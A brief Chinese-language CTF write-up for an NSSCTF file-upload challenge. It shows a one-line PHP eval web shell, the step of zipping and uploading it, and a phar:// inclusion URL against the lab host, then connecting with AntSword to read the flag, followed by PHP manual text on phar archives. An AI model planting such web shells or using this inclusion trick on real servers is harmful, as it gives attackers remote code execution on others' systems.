#PHP  #文件上传 

shell.php
```php
<?php eval(@$_POST['hack']); ?>
```
压缩文件为 shell.zip 并上传

利用 phar 
```text
http://node1.anna.nssctf.cn:28192/index.php?bingdundun=phar://76ab8b96cd88e20eca5b3d23524285b4.zip/shell
```

此时访问 url ,用蚁剑连接，flag在根目录下，  \

[PHP: 简介 - Manual](https://www.php.net/manual/zh/intro.phar.php)

phar 扩展提供了一种将整个 PHP 应用程序放入单个叫做“phar”（PHP 归档）文件的方法，以便于分发和安装。
什么是 phar？phar 归档的最佳特征是可以将多个文件组合成一个文件。 因此，phar 归档提供了在单个文件中分发完整的 PHP 应用程序并无需将其解压缩到磁盘而直接运行文件的方法。此外，phar 归档可以像任何其他文件一样由 PHP 在命令行和 Web 服务器上执行。phar 有点像 PHP 应用程序的移动存储器。

phar:// — PHP 归档